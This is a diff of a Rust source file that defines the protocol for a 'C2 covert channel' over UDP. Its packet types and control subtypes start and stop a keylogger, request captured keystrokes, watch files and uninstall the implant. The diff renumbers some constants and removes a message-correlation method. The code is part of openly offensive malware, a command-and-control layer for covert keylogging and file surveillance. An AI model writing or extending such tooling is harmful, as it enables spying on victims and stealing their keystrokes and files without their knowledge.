@@ -1,5 +1,4 @@
 /// Application-layer protocol for C2 covert channel.
-/// All protocol data lives in UDP PAYLOAD only.
 use uuid::Uuid;
 
 // Packet types
@@ -13,19 +12,16 @@ pub const PACKET_TYPE_KEYLOG: u8 = 7;
 pub const PACKET_TYPE_CTRL: u8 = 8;
 pub const PACKET_TYPE_FILE_WATCH: u8 = 9;  // ADD THIS
 
-// Control subtypes for PACKET_TYPE_CTRL
+// Control subtypes
 pub const CTRL_START_KEYLOGGER: u8 = 1;
 pub const CTRL_STOP_KEYLOGGER: u8 = 2;
 pub const CTRL_REQUEST_KEYLOG: u8 = 3;
 pub const CTRL_UNINSTALL: u8 = 4;
 
-// File watch subtypes for PACKET_TYPE_FILE_WATCH
-pub const FILE_WATCH_INIT: u8 = 1;
-pub const FILE_WATCH_UPDATE: u8 = 2;
-pub const FILE_WATCH_DELETE: u8 = 3;
-pub const FILE_WATCH_STOP: u8 = 4;
+// File watch subtypes
+pub const FILE_WATCH_UPDATE: u8 = 1;
+pub const FILE_WATCH_DELETE: u8 = 2;
 
-// Fixed 32-byte header in UDP payload
 pub const HEADER_SIZE: usize = 32;
 
 #[derive(Debug, Clone, Copy)]
@@ -127,9 +123,5 @@ impl PacketHeader {
             sequence: u16::from_le_bytes(bytes[22..24].try_into().ok()?),
             flags: u16::from_le_bytes(bytes[24..26].try_into().ok()?),
         })
-    }
-
-    pub fn correlate(&self, other: &Self) -> bool {
-        self.message_id == other.message_id
     }
 }
